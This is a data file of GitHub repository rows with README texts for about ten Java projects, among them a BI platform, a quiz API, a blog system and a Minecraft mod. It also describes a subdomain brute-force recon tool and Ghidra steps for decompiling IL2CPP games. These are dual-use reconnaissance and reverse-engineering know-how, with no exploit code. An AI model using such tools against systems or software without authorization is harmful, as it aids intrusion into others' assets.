which at compile time are translated into hardware-performant and human-readable code. [Would you like to know more?](https://kora-projects.github.io/kora-docs/en/)
",16,2,9,Apache-2.0
ttoklip/BackEnd,Refactor/15-change-to-multi-module,,2,2,8,
isabellaim/POO-P03-G04,main,,0,11,1,
change-everything/nexura-next-bi,master,"![logo.png](next-bi-backend%2Fimage%2Flogo.png)

# next BI
## 项目介绍

基于 Spring Boot + MQ + AIGC + React的智能数据分析平台。区别于传统 BI，用户只需要导入原始数据集、并输入分析诉求，就能自动生成可视化图表及分析结论，实现数据分析的降本增效。

## 流程图
![流程图.png](next-bi-backend%2Fimage%2F%E6%B5%81%E7%A8%8B%E5%9B%BE.png)


## 项目亮点

### 1. 智能数据分析流程：

- 后端通过自定义Prompt预设模板，封装用户输入的数据和分析诉求。
- 通过AIGC接口生成可视化图表的JSON配置和分析结论，返回给前端进行渲染。

### 2. Excel文件处理优化：

- 由于AIGC的输入Token限制，采用Easy Excel解析用户上传的XLSX表格数据文件并压缩为CSV格式。
- 实测结果显示，此优化提高了单次输入数据量约20%，同时也实现了成本的有效节约。

### 3. 安全性增强：

- 对用户上传的原始数据文件进行多重校验，包括后缀名、大小、内容等，以确保系统的安全性。
- 利用Easy Excel解析成功的文件基本可以确认其内容的合法性。

### 4. 分布式限流与资源控制：

- 基于Redisson的RateLimiter实现分布式限流，控制单用户访问频率，防止恶意占用系统资源。

### 5. 数据存储与查询性能优化：

- 使用MyBatis + 业务层构建自定义SQL，实现对每份原始数据的分表存储，提高查询性能和系统的可扩展性。
- 数据分表存储提高了查询灵活性，同时带来了性能的显著提升。

### 6. 异步化任务处理：

- 基于自定义的IO密集型线程池和任务队列，实现AIGC的并发执行和异步化。
- 提交任务后即可响应前端，大幅度提高用户体验，支持更多用户排队而不是给系统无限压力导致提交失败。

### 7. 消息队列和可靠性提升：

- 引入RabbitMQ分布式消息队列，用于接收和持久化任务消息。
- 通过Direct交换机转发给解耦的AI生成模块消费，提高系统的可靠性，确保任务的可靠处理。

## 优化和增强

### 1. 数据处理进一步优化：

- 利用AI进一步整理和压缩原始数据，提高输入的数据数量和质量。

### 2. 系统资源控制：

- 限制用户同时生成图表的数量，防止单个用户抢占系统资源。

### 3. 用户统计和积分系统：

- 统计用户生成图表的次数，考虑添加积分系统，用户可以消耗积分进行智能分析。

### 4. 缓存优化：

- 由于图表数据是静态的，考虑使用Redis缓存来提高加载速度。

### 5. 异常处理和重试机制：

- 使用死信队列处理异常情况，将图表生成任务置为失败。
- 为任务的执行增加Guava Retrying重试机制，保证系统的可靠性和稳定性。

### 6. 超时控制和反向压力：

- 为任务的执行增加超时时间，超时自动标记为失败，提高系统稳定性。
- 考虑根据调用的服务状态来选择当前系统的策略，实现反向压力控制。

### 7. 实时消息通知：

- 实现任务执行成功或失败后，通过WebSocket或Server-Sent Events给用户发送实时消息通知，提高用户体验。



## 截图
![login.png](next-bi-backend%2Fimage%2Flogin.png)
![index.png](next-bi-backend%2Fimage%2Findex.png)
![fill_index.png](next-bi-backend%2Fimage%2Ffill_index.png)
![success.png](next-bi-backend%2Fimage%2Fsuccess.png)
![sse.png](next-bi-backend%2Fimage%2Fsse.png)
![mychart.png](next-bi-backend%2Fimage%2Fmychart.png)
![detail.png](next-bi-backend%2Fimage%2Fdetail.png)
![wait.png](next-bi-backend%2Fimage%2Fwait.png)
![running.png](next-bi-backend%2Fimage%2Frunning.png)
![failed.png](next-bi-backend%2Fimage%2Ffailed.png)


## 部署流程
部署流程日后更新，请关注。。。

## 技术栈


![Static Badge](https://img.shields.io/badge/AIGC-blue)
![Static Badge](https://img.shields.io/badge/Spring%20Boot-green)
![Static Badge](https://img.shields.io/badge/RabbitMQ-orange)
![Static Badge](https://img.shields.io/badge/Redis-red)
![Static Badge](https://img.shields.io/badge/React-skyblue)
![Static Badge](https://img.shields.io/badge/Guava%20Retrying-gray)
![Static Badge](https://img.shields.io/badge/Server%20Sent%20Events-black)
...


## 作者

- [@peiYp](https://github.com/change-everything)


## 反馈

如果你有任何反馈，请联系我：pyptsguas@163.com

",1,0,1,Apache-2.0
wenyi401/HyperIsle-Lua,master,"# Hyper Isle
## 兴趣使然

通过lua和java交互，实现lua 使用xp库进行hook
",0,0,1,
jakzo/Il2CppDecompiler,main,"Ghidra extension for decompiling code from a Unity IL2CPP game to C#.

## ➡️ Usage

> Note that it is powered by GPT4 so will require an OpenAI account to decompile functions.

1. Get an OpenAI platform account
   - [Get access to the OpenAI API](https://platform.openai.com/signup)
   - Generate an API key and save it somewhere safe
1. Get game outputs from Il2CppDumper
   - Install [Il2CppDumper](https://github.com/Perfare/Il2CppDumper)
   - Dump outputs (example command below)
     ```sh
     ./Il2CppDumper /path/to/game/GameAssembly.dll /path/to/game/resources/global-metadata.dat ./il2cpp_out
     ```
1. Set up Ghidra project
   - Install [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases)
   - Run `ghidraRun` -> create new project -> Import game code file (`GameAssembly.dll`)
   - Open game file -> auto analyze (default options) -> wait until done (could be an hour or more)
   - File -> Parse C source -> add `il2cpp.h` from Il2CppDumper output -> parse and wait until done
   - Window -> Script manager -> add Il2CppDumper directory (the one containing `ghidra_with_structs.py`) -> run `ghidra_with_structs.py` from the list -> follow prompts and wait until done
1. Check that decompilation works correctly
   - Find a function from the game in Ghidra and look through the decompiled C code to make sure it makes sense
   - For my game (Boneworks) the `il2cpp.h` generated by Il2CppDumper was missing a field in all class instances which made all field offsets wrong and caused property accesses to be off by 8 bytes
1. Rename functions (usually exception throwing functions)
   - The script will not run if there are unnamed functions being called (eg. `FUN_1234abcd`) in the method being decompiled
   - Find your function in Ghidra and look at the decompiled C code
   - There should be lots of `if (someVar != (SomeType)0x0) { ... } FUN_1234abcd();` which are null checks (since C# will throw a `NullReferenceException` if `x` is null in `x.y`)
   - Rename the exception function (`FUN_1234abcd` in the example above) to `ThrowNullReferenceException` and mark it as ""No Return""
   - In future I may automate this step
1. Install the Il2CppDecompiler.java script
   - Download the [Il2CppDecompiler.java script](./ghidra_scripts/Il2CppDecompiler.java)
   - Open the script manager in Ghidra (Window -> Script Manager)
   - Click the ""Manage Script Directories"" button
   - Add the directory containing the downloaded Il2CppDecompiler.java script
1. Run the Il2CppDecompiler.java script
   - Navigate to the method you want to decompile
   - Window -> Script Manager -> Il2CppDecompiler -> Follow the prompts

You can also run it in headless mode. First make sure the project is not currently open in Ghidra then run the command from [test-script.sh](./test-script.sh).

## 🛠️ Development

This repo contains an extension which doesn't really do anything yet. I planned to convert Ghidra's P-code (intermediate representation of machine code) to C# and build a UI for viewing/editing decompiled C# inside Ghidra (similar to the existing C decompiler) but this approach was taking too long so I pivoted to writing a script which sends the code to an LLM to do all the work for me. 🤷

### Script

[./ghidra_scripts/Il2CppDecompiler.java](./ghidra_scripts/Il2CppDecompiler.java) contains the LLM-based script. It also still contains the proof-of-concept hacky string replacement approach I started with. You can edit the file as-is, but I like to clone the Ghidra source code, set that up and symlink Il2CppDecompiler.java into one of the ghidra_scripts folders there so that I get autocomplete with doc comments and can go to source of internal Ghidra functions. Run [link.sh](./link.sh) to automatically set that up then edit the [Il2CppDecompiler.java which is linked inside the ghidra directory](./ghidra/Ghidra/Features/Decompiler/ghidra_scripts/Il2CppDecompiler.java).

#### Debugging

You can run the script during development by making sure Ghidra is closed then running [test-script.sh](./test-script.sh). Before first run, make sure you set the variables in the script in [gradle.properties](./gradle.properties) or as environment variables. You can also attach a debugger by running the script like this:

```sh
MODE=debug-suspend ./test-script.sh
```

Note that this script is for Unix systems. You're probably using Windows so you'll have to convert it to a `.bat` script or something. Please open a PR if you do. 😄

### Extension

Note that the extension doesn't do anything yet. I originally intended to build an interface for the decompiled C# code, like the existing interface for decompiled C.

1. Create/modify [gradle.properties](gradle.properties) to contain:
   ```env
   GHIDRA_INSTALL_DIR=<absolute_path_to_your_ghidra_installation>
   ```
1. Then build with:
   ```sh
   gradle
   ```
",0,1,1,
sviperll/result4j,main,"Result-type for Java
====================

The project provides Result-type similar to Result-type in Rust that
allows to return either successfull result or otherwise some kind of error.

In Java, the native way of reporting errors are exceptions, either checked or unchecked.
You do not need Result-type most of the time in Java-code, where
you can directly throw exceptions.
But there are situations, where more functional-style is used.
In such situations pure-functions are expected that throw no exceptions.
Handling exception in such situations can be cumbersome and require a lot of boilerplate code.
Result-type and associated helper-classes help with exception handling and
allow to write idiomatic functional code that can interact with methods that throw exceptions.

Result-type provides a way to pass error enformation as a first-class value through
the code written in functional style.
Routines are provided for interoperability of normal code that uses exception and
functional code that uses Result-type, so that exceptions can be caught and propagated as
errors in Result-type and then rethrown again later in the control-flow.

Getting Started
---------------

result4j
[is available in Maven Central](https://central.sonatype.com/artifact/com.github.sviperll/result4j).

````
        <dependency>
            <groupId>com.github.sviperll</groupId>
            <artifactId>result4j</artifactId>
            <version>1.0</version>
        </dependency>
````

Overview
--------

[API Documentation is available for reference](https://www.javadoc.io/doc/com.github.sviperll/result4j).

Result type can be either a successful result or some kind of error.

````java
Result<String, E> suc = Result.success(""Hello, World!"");
````

The above line declares successful result value.

````java
Result<String, Integer> err = Result.error(404);
````

The above line declares error-value.

````java
Result<String, Integer> result = ...;
switch (result) {
    case Result.Success<String, Integer>(String value) -> System.out.println(value);
    case Result.Error<String, Integer>(Integer code) ->
            throw new IOException(""%s: error"".formatted(code));
}
````

Pattern matching can be used to check unknown result value as shown above.

````java
Result<String, Integer> receivedResult = ...;
String value = receivedResult.throwError(code -> new IOException(""%s: error"".formatted(code)));
System.out.println(value);
````

Instead of a low-level pattern-matching,
higher level helper-methods are available in `Result`-class.
In the snippet above `throwError` is used to throw exception when `Result` contains error.

Result-type is created for interoperability between normal Java-code that throws exception and
more functional code.

````java
Catcher.ForFunctions<IOException> io =
    Catcher.of(IOException.class).forFunctions();
String concatenation =
        Stream.of(""a.txt"", ""b.txt"", ""c.txt"")
                .map(io.catching(name -> loadResource(name)))
                .collect(ResultCollectors.toSingleResult(Collectors.join()))
                .throwError(Function.identity());
````

Above code uses `Catcher` class to adapt functions that
throw exceptions to return Result-type instead.
`ResultCollectors` class contains helper-methods to collect multiple `Result`s into a single one.
You do not need `Catcher` class in normal Java-code, where you can directly throw exceptions.
But the above snippet can serve as an example of situations, where more functional-style is used.
In such situations pure-functions are expected that throw no exceptions.
Handling exception in such situations can be cumbersome and require a lot of boilerplate code.

````java
class MyMain {
    String loadResource(String name) throws IOException {
        // ...
    }

    void main(String[] args) throws IOException {
        Catcher.ForFunctions<IOException> io =
            Catcher.of(IOException.class).forFunctions();
        Function<String, Result<String, IOException>> f = io.catching(MyMain::loadResult);
        Result<String, IOException> result = f.apply(""my-resource"");
        String value = result.throwError(Function.identity());
        System.out.println(value);
    }
}
````

The example above shows the usage of the `catching` method of the `Catcher` class, that
allows to adapt exception throwing method and instead to have a method that returns `Result` with
exception representing as an error-value.

There is also an `AdaptingCatcher` class that allows to adapt or wrap exceptions.

````java
AdaptingCatcher.ForFunctions<IOException, PipelineException> io =
        Catcher.of(IOException.class).map(PipelineException::new).forFunctions();
AdaptingCatcher.ForFunctions<MLException, PipelineException> ml =
        Catcher.of(MLException.class).map(PipelineException::new).forFunctions();
List<Animal> animals1 =
        List.of(""cat.jpg"", ""dog.jpg"")
                .stream()
                .map(io.catching(Fakes::readFile))
                .map(Result.flatMapping(ml.catching(Fakes::recognizeImage)))
                .collect(ResultCollectors.toSingleResult(Collectors.toList()))
                .throwError(Function.identity());
Assertions.assertEquals(List.of(Animal.CAT, Animal.DOG), animals1);
````
",0,0,1,Apache-2.0
Rabb1tQ/SubDomainHunter,main,"# SubDomainBrute
Java子域名爆破工具
## 描述

### 爆破：

现经过优化后，预计31297个域名调整好参数后大概在16秒左右能够跑完，效果大概如下图：
![img.png](img/img.png)

### 已添加子域获取接口：

* AlienVault
* Anubis
* Rapiddns
* SiteDossier
* DomainGlass
* Rapiddns
* VirusTotal

## 使用方法：

将PortService放到Jar包所在目录下，后执行`java -jar JarName`，参数项：

```
Usage: <main class> [options]
  Options:
  * --domain, -d
      目标域名
    help, --help
      查看帮助信息
    --nameserver, -n
      超时时间
    --threads, -t
      线程数
      Default: 100
```

## 子域获取接口添加：

1. `com.rabbitq.models.impl`包下添加你的子域获取接口类，
2. 继承`SubDomainInterface`接口并添加`@SubDomainInterfaceImplementation`注解
3. 重写`getSubDomain`方法，接收参数为`jcommander`的实体类，返回值为`Set<String>`，通过`targetOptionsEntity.getDomain()`可以获取到目标域名
4. 自定义异常捕捉，失败在终端中打印失败原因，成功在终端打印获取条数（非必须）
5. 直接运行即可，无需其他操作

## 声明

本项目可用于**商业用途**，但必须保留作者版权

此项目开发的初衷是方便安全研究者及网站运营者**检测漏洞并修复以及教育学习使用**。

本项目**严格禁止一切通过本程序进行的违反任何国家法律行为**，请在合法范围内使用本程序。

本人不会上传未公开的漏洞利用，也不允许工具中存在破坏性的语句，本项目未进行大量的网络扫描行为，只通过各类的API接口进行获取。

使用本程序则**默认视为**你**同意**我们的规则，请您务必遵守**道德与法律准则**。

如不遵守，**后果自负**，开发者将不承担任何责任！
",5,0,1,
Poempoat/LimboEmulatorPlus,main,"# Limbo Emulator Plus

<div>
<a href=""https://limboplus.xtzyj.top""><img src=""resources/icon_640x640.png"" alt=""limboemuplus icon"" title=""LimboEmulatorPlus"" align=""right"" height=""60px"" /></a>
</div>

A secondary development version of Limbo Emulator.

# Links

Limbo Emulator: https://github.com/limboemu/limbo
",5,5,1,GPL-2.0
SamucaDoJava/quiz,main,"## Execução do Sistema e Configuração da Base de Dados

### Antes de iniciar o sistema, execute os seguintes comandos:
## IMPORTANTE!
para iniciar a aplicação é preciso escolher um dos arquivos enviroments que estão na pasta raiz do sistema de nome env dentro desta pasta 
existe arquivos de enviroments necessários par aa aplicação funcionar, para ativalos você precisará criar três variáveis de ambiente, exemplo:

Caso use no Intellij em ""Edit configurations da aplicação *local aonde roda a aplicação"" coloque as seguintes variáveis no campo 
Enviroment variables:
````
ENV_FILE=windows-local;ENV_PATH=./env;USE_ENV_FOLDER_PROFILE_ENVIRONMENTS=true
````
Isso fará com que o sistema pegue as configurações de banco de dados do arquivo ""windows-local"" que está dentro da pasta env logo na raiz do projeto.
por isso especificamos ENV_PATH como ./env e ENV_FILE como windows-local, dito isso precisamos entender mais um atributo.

O USE_ENV_FOLDER_PROFILE_ENVIRONMENTS é a variável que ativa a leitura dos arquivos da pasta env, ou seja, além de especificar o caminho e nome da pasta env
você precisa especificar como true para a variável de ambiente USE_ENV_FOLDER_PROFILE_ENVIRONMENTS, caso contrário o sistema irá ignorar esses arquivos e tentar 
ler os valores das variáveis de ambiente, direto no ambiente, ou seja do sistema operacional, você poderá mudar de ambiente usando arquivos diferentes ou desativar todos eles
e pegar os valores do ambiente local da aplicação destivando essa variável USE_ENV_FOLDER_PROFILE_ENVIRONMENTS = false.

### Iniciando via docker file:
Com docker file a ideia é a mesma, o arquivo docker-composer.yml por default está usando as enviroments que são provenientes de um dos arquivos da pasta env por exemplo docker.env ou digital-ocean-remote.env
São esses arquivos que especificam por exemplo usuário e senha da base de dados e url de conexão e outras configurações.

instale as dependências:
```
mvn clean install -DskipTests
```

### Criação da Base de Dados

#### método  1 criando banco de dados manualmente: 
1° No banco de dados PostgreSQL, crie uma base de dados vazia com o nome (quiz_moba_db).
2° Em seguida, abra o prompt de comando (CMD) na raiz do projeto e execute:

```
mvn flyway:migrate
```


Se a senha do banco for diferente da especificada em flyway.conf, forneça a senha usando:
```
mvn flyway:migrate -Dflyway.password=<SUA_SENHA>
```
Substitua <SUA_SENHA> pela senha do banco PostgreSQL. 
Exemplo:

```
mvn flyway:migrate -Dflyway.password=123Mudar
```

Este comando cria questões, alternativas e configurações do sistema, além de três usuários válidos com IDs 1, 2 e 3.

#### método 02 rodando os migrations a partir de um arquivo bat na raiz da aplicação.
Execute o arquivo load-my-flayway-migrations.bat para rodar as migrations do sistema, a base de dados precisa existir no banco de dados.

#### método 03 rodando a partir do docker.
O docker já vai criar as migrations caso você especifique um arquivo válido, atualmente os arquivos válidos são docker.env e digital-ocean-remote.env
verifique a estrutura desses arquivos para entender de todas as variáveis de ambientes estão declaradas corretamente dentro deles, lembrese de que o docker-compose.yml
precisa de 3 enviroments locais para ativar essa leitura mas elas já está lá declaradas no arquivo, sendo elas:
````
    environment:
      ENV_FILE: digital-ocean-remote
      ENV_PATH: /app/env
      USE_ENV_FOLDER_PROFILE_ENVIRONMENTS: true
````
Se USE_ENV_FOLDER_PROFILE_ENVIRONMENTS for false o sistema ignorará os arquivos de enviroments e tentará ler as env no local aonde a aplicação está sendo ininicializada.

## Testando a API (Iniciando uma Partida)

### Acessando a Documentação Padrão do Projeto
Se o sistema estiver na porta padrão e localhost, acesse a URL padrão do Swagger para obter a documentação da API:

```
http://localhost:8080/swagger-ui/index.html#/
```

Se os comandos mvn clean install e mvn flyway:migrate foram executados com sucesso, não é necessário cadastrar um usuário, configurações do sistema ou carregar dados para questões e temas. Nesse caso, vá para a seção Swagger chamada (gameplay-controller).

No controlador de gameplay, inicie o jogo acessando a requisição:
```(gameplay-controoler)```

```
http://localhost:8080/gameplay/start
```

A requisição é do tipo POST e requer um objeto JSON no corpo com os parâmetros:

````
{
  ""userId"": 1,
  ""theme"": ""Cinema"",
  ""level"": ""Facil""
}
````

Para rodar este passo via CMD com o comando CURL, use o script abaixo:

````
curl -X 'POST' \
  'http://localhost:8080/gameplay/start' \
  -H 'accept: */*' \
  -H 'Content-Type: application/json' \
  -d '{
  ""userId"": 1,
  ""theme"": ""Cinema"",
  ""level"": ""Facil""
}'
````

Atenção:
Se a carga de dados do sistema não foi bem-sucedida, será necessário cadastrar um usuário, pelo menos um tema (theme) com dados de questões e alternativas, e uma configuração. Se necessário, navegue entre as outras requisições do controlador e cadastre os dados manualmente.

Você receberá um objeto JSON com os parâmetros da sessão de gameplay recém-iniciada. Se a resposta tiver status 200, receberá algo semelhante a:

````
{
  ""gameplaySessionId"": 49,
  ""responseMessage"": ""Existe uma sessão carregada para o usuário, você precisa primeoro terminar a sessão atual para começar outra.""
}
````

Importante:
O campo gameplaySessionId sempre terá um valor diferente para cada sessão criada. Cada sessão de jogador é única. O campo responseMessage orienta sobre os próximos passos. Neste manual, já havia uma sessão na base de dados, resultando na mensagem para terminar a sessão ativa antes de iniciar outra.

Agora que temos uma sessão de gameplay ativa e sabemos como ela funciona, vamos de fato jogar o jogo!
vá até requisição:

````
http://localhost:8080/gameplay/find-question-in-session/{userId}/{gameplaySessionId}
````

Se estiver usando o Swagger, insira o mesmo userId e gameplaySessionId usado no start gameplay (primeira requisição).

Você também pode rodar essa parte do projeto usando o comando CURL executando o comando abaixo:

````
curl -X 'GET' \
  'http://localhost:8080/gameplay/find-question-in-session/1/49' \
  -H 'accept: */*'
  
````

Atenção! Atente-se que o comando acima usa um id de exemplo de usuário (1) e um id se sessão de
usuário de exemplo (49) mas no seu caso você precisará passar valores válidos recuperados da
request gameplay/start

Ao fazer a chamada com campos válidos é retornada uma resposta de um objeto JSON no corpo da sua 
requisição contendo uma pergunta e alternativas dessa pergunta, algo muito próximo ao apresentado
a seguir:

````
{
  ""question"": ""Qual é o filme brasileiro mais premiado internacionalmente?"",
  ""questionId"": 9,
  ""inGameAlternativeDTO"": [
    {
      ""id"": 33,
      ""alternative"": ""Central do Brasil"",
      ""referenceLetter"": ""A""
    },
    {
      ""id"": 34,
      ""alternative"": ""Cidade de Deus"",
      ""referenceLetter"": ""B""
    },
    {
      ""id"": 35,
      ""alternative"": ""Tropa de Elite"",
      ""referenceLetter"": ""C""
    },
    {
      ""id"": 36,
      ""alternative"": ""O Pagador de Promessas"",
      ""referenceLetter"": ""D""
    }
  ],
  ""userMessage"": ""Muito bem meu caro jogador responda a pergunta para continuar o jogo!"",
  ""unplayedQuestions"": 29
}

````

Muito bem temos uma sesão ativa e uma questão a ser respondida, o que nos falta agora é responder
a pergunta para sabermos se ganhamos a primeira rodada do jogo ou não, não é mesmo? Então para isso
precisamos ir na nossa terceira e ultima request que fecha o ciclo da primeira rodada da gameplay,
para isso vamos ir até a request:

````
http://localhost:8080/gameplay/validate-selected-question-alternative
````

E iremos passar os seguintes parâmetros em um objeto JSON para validar a nossa alternativa!

````
{
  ""userId"": 1,
  ""gameplaySessionId"": 49,
  ""selectedAlternative"": ""A""
}
````

Você também pode user o comando CURL via CMD para fazer esse passo, mas precisará editar os parametros 
do exemplo abaixo:

````
curl -X 'GET' \
  'http://localhost:8080/gameplay/validate-selected-question-alternative?userId=1&gameplaySessionId=49&selectedAlternative=A' \
  -H 'accept: */*'
````

Note que precisei passar o id válido do usuário que usei por todos os outros processos do jogo
e também a gameplaySessionId para o sistema saber que usuário e sessão estamos jogando, e claro
nesse ultimo passo precisamos também de passar a alternativa que achamos ser a correta para a 
pergunta anterior, pois bem! Agora iremos executar o sistema e ter o nosso resultado da primeira
partida:

Ao receber uma resposta bem sucedida da requisição alterior nos iremos obter uma response com status
200 e um objeto JSON com as devidas informações da primeira rodada da gameplay:

````
{
  ""playerMessage"": ""O jogador perdeu! e não recebeu pontos na sessão até o momento!"",
  ""playerPunctuation"": 0,
  ""selectedAlternative"": ""A"",
  ""correctAlternative"": ""D - O Pagador de Promessas"",
  ""currentSessionScore"": null,
  ""isSessionOver"": false,
  ""sessionOverMessage"": null
}
````

Os campos de retorno por si só já são alto explicativos em suas finalidades.

#### playerMessage:
Apresenta uma mensagem ao jogador explicando o que ocorreu na validação da sua alternativa, podendo variar
entre uma mensagem informando que você ganhou ou perdeu a partida.

#### playerPunctuation:
    Pontuação obtida na rodada que acabou de responder. os pontos podem variar dependendo
    do seu level, sendo possível ganhar mais ou menos pontos, o level é especificado no inicio na primeira
    requisição em gameplay/start quanto maior o level mais pontos por rodada.

#### selectedAlternative:
    Alternativa selecionada anteriormente pelo jogador.

#### correctAlternative:
    Retorna a resposta com a alternativa correta concatenando com a descrição da alternativa correta.

#### currentSessionScore:
    Total de pontos de toda a sessão que está ativa até o momento, é a soma de todos os pontos (Questões que o usuário acertou) até 
    o momento atual da sessão.

#### isSessionOver:
    Sempre retornará false por toda a gameplay, apenas na na ultima rodada da sessão ele retornará true para indicar ao consumidor do serviço que 
    ao chamar em uma proxima request será necessário reiniciar o ciclo inteiro, ou seja chamar novamente gameplay/start e recuperar um novo id de sessão
    pois a sessão atual chegou ao fim quando esse boolean retornar true.

### sessionOverMessage:
    Caso isSessionOver retornar true que condiz com uma sessão que acabou de terminar, o campo sessionOverMessage
    retornará também uma mensagem informativa explicando que a sessão do usuário terminou.

### Adicione as enviroments para rodar localmente a partir dos arquivos da raiz do projeto:
No Intellij inserir as env da forma que estão a seguir para ativar a leitura do arquivo windows-local
pasta que fica na raiz do projeto de nome ENV_FILE caso precise de uma configuração extra apenas
crie o arquivo com a nova configuração e mude o ENVI_FILE para o nome do seu arquivo.
````
ENV_FILE=windows-local;ENV_PATH=./env;APPLICATION_ENVIRONMENT=local
````

### Comandos docker importantes para construir a aplicação:

Fazer o build da aplicação:
````
docker build --no-cache -t quiz-quiz-app .
````

Subir a aplicação:
````
docker-compose up -d  
````

Verificar os logs da aplicação:

````
docker-compose logs quiz-app
````",0,0,16,
alegian/thaumcraft7,main,"# Thaumcraft 7 (Thavma)

## Preface

A complete rewrite & re-imagination of azanor's Thaumcraft for modern versions of Minecraft.
I am in no way associated with azanor and will not use any of their assets,
except perhaps temporarily the mod name (which I will also change upon release).

What version of Thaumcraft am I rewriting? None specifically. I am going to implement what
I enjoyed most from each version (my favorite being Thaumcraft 4.2). I plan to add
features that did not exist in the original mod, and change old features to give them
fresh new mechanics, visuals and names.

I happen to be Greek, Thaumaturgy literally means ""the act of performing miracles"".
Good pick azanor ;-)

## Credit

- Azanor, for being the original author of my favorite mod
- The NeoForge Project discord community, for answering my questions countless times
- Team CoFH, for allowing anyone to learn from their code. Also, modified versions of their license and their package
  structure are used here
- McJTy, for their minecraft modding tutorials
- The JEI team, for being open source. Their codebase taught me how to use custom Texture Atlases
- The https://game-icons.net/ team, for their free icons, under
  the [CC BY 3.0](https://creativecommons.org/licenses/by/3.0/) license. All icons were taken as-is
- Reaves, for their awesome original models & textures
- Gigaherz, for
  their [custom core shader tutorial gist](https://gist.github.com/gigaherz/b8756ff463541f07a644ef8f14cb10f5), pretty
  much the only resource online that describes this process
- The Artifacts team, for being open source. Their codebase taught me how to use Attribute Modifiers and how to render
  custom cuboids on HumanoidModels

## License

This repository uses a modified version of the CoFH ""Don't Be a Jerk"" License v2. [Read the file](LICENSE.md) for
details.
",0,0,1,NOASSERTION
wch2019/xiaohai-blog,dev,"## DotCode(点码）

<p align=center>
  <a href=""https://gitee.com/wch2019/xiaohai-blog"">
    <img src=""doc/docs/image/favicon.ico"" alt=""DotCode"" style=""border-radius: 50%"">
  </a>
</p>

<p align=""center"">
   <a target=""_blank"" href=""https://github.com/wch2019"">
      <img src=""https://img.shields.io/hexpm/l/plug.svg""/>
      <img src=""https://img.shields.io/badge/JDK-17+-green.svg""/>
      <img src=""https://img.shields.io/badge/springboot-2.7.7-green""/>
      <img src=""https://img.shields.io/badge/vue-2.6.10-green""/>
      <img src=""https://img.shields.io/badge/mysql-8.0+-green""/>
      <img src=""https://img.shields.io/badge/mybatis--plus-3.5.3.1-green""/>
      <img src=""https://img.shields.io/badge/redis-6.0.5-green""/>
   </a>
</p>
<img src=""./doc/docs/image/web/editCenter.png""/>

## 前言

 本着不想造轮子的理念用过**halo**和**hexo**，见过 **[蘑菇博客](https://gitee.com/moxi159753/mogu_blog_v2)**和**[拾壹博客](https://gitee.com/quequnlong/shiyi-blog)**。别人的用着终究不是很顺手。最终觉得还是自己写个用也是不错的，就当做练手，也是为了折腾。在2023年初开始本项目的开发，开始打算简单写写能用就行，不过最后感觉既然都写了，那就多写点东西吧。目的打造一个**笔记+博客+本地网盘**的项目，现在还没完全构思好，边写边构思。(本项目还未完成，持续更新中，如果有想法的小伙伴也可以分享自己的看法)

## 项目介绍

DotCode(点码），是一个前后分离的博客系统。

前端使用 **Vue** + **ElementUi** 和**Vue 3 + TypeScript + Vite + ElementPlus**

后端使用 **SpringBoot** + **Mybatis-plus**进行开发，使用**Sa-Token**作为登录验证和权限校验。

## 项目特点

- 后台采用父子包的方式以及友好的代码结构及注释，便于阅读及二次开发

- 实现前后端分离，通过 **Json** 进行数据交互，前端再也不用关注后端技术

- 页面交互，后台管理使用 **Vue2.x**，门户展示采用**Vue3**。

- 引入 **RBAC** 权限管理设计，灵活的权限控制，按钮级别的权限控制，满足绝大部分的权限需求

- 采用**Markdown** 编辑器([vditor](https://b3log.org/vditor/)），更符合开发者的编辑方式

- 一键建站，快速迁移，数据备份，Markdown导入，Markdown导出

##  项目目录

- doc：资源文件；
- xiaohai_admin: 系统入口； 
- xiaohai_common：提供公共类；
- xiaohai_file：提供文件上传相关服务；
- xiaohai_generator：提供mybatis-plus代码生成相关服务；
- xiaohai_note：提供博客相关服务；
- xiaohai_system：提供系统(用户、角色、菜单、字典等)相关服务；
- xiaohai_web： VUE2的后台管理页面；
- xiaohai_web-show：VUE3的门户网站；

## 未来计划

- [x] 基础框架搭建
- [x] 增加用户管理
- [x] 增加角色管理
- [x] 增加菜单管理、按钮级别的权限控制
- [x] 增加数据字典管理
- [x] 增加在线用户管理
- [x] 增加标签、分类管理
- [x] 增加文章、写作管理
- [x] 增加必应图片接口
- [x] web-show页面使用web页面登录
- [x] 适配web-show页面的移动端布局
- [x] 增加评论模块、评论表情
- [x] 增加友链管理
- [x] 增加点赞模块
- [x] 增加web-show页面日志管理
- [x] 增加流量访问监控
- [x] 增加Markdown文章导入
- [x] 增加留言模块
- [x] 通过Jpom实现自动化部署
- [x] 增加网站配置
- [x] 增加问题反馈管理
- [x] 文件管理
- [X] 本地笔记同步
- [X] 邮箱提醒功能
- [X] 消息通知
- [ ] IP限流
- [ ] 第三方登录
- [X] 第三方平台获取、CSDN、掘金、简书、博客园、知乎
- [ ] 第三方平台同步
- [ ] 大模型辅助写博客
- [X] 数据备份，Markdown导入，Markdown导出
- [ ] ...

## nginx配置

```    
server {
    listen       80;
    server_name  localhost;
    
        location / {
            alias D:/bolg/xiaohai-web-show/;   #修改为xiaohai-web-show的打包路径
            try_files $uri $uri/ /index.html;
            index  index.html index.htm;
        }
    
        location /manage/ {
            alias  D:/bolg/xiaohai-web/; #修改为xiaohai-web的打包路径
            try_files $uri $uri/ /manage/index.html;
            index  index.html index.htm;
        }
    
        location /prod-api/ {
    	    proxy_set_header Host $http_host;
    	    proxy_set_header X-Real-IP $remote_addr;
    	    proxy_set_header REMOTE-HOST $remote_addr;
    	    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    	    proxy_pass http://127.0.0.1:8089/prod-api/; #修改为后台请求地址
    	}
    
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
    
```
## 打赏
如果觉得项目不错的话可以打赏哦。您的支持就是我最大的动力！

<img src=""./doc/docs/image/beg.gif"" width=""200""/><img src=""./doc/docs/image/wxpay.jpg"" width=""200"" />

## 捐赠信息

| 捐赠者     | 捐赠金额 | 捐赠日期   |
| ---------- | -------- | ---------- |
| Powerless🌨 | 1元      | 2024-03-19 |



## 特别鸣谢

- 感谢 [JetBrains](https://jb.gg/OpenSourceSupport) 提供的免费开源 License：

[<img src=""./doc/docs/image/jb_beam.png"" width=""100"" />](https://www.jetbrains.com/?from=xiaohai_blog)

## 网站截图

### web

|                     web                      |                     web                     |
|:--------------------------------------------:|:-------------------------------------------:|
| ![image text](doc/docs/image/web/register.png)  |  ![image text](doc/docs/image/web/login.png)   |
| ![image text](doc/docs/image/web/dashboard.png) | ![image text](doc/docs/image/web/article.png)  |
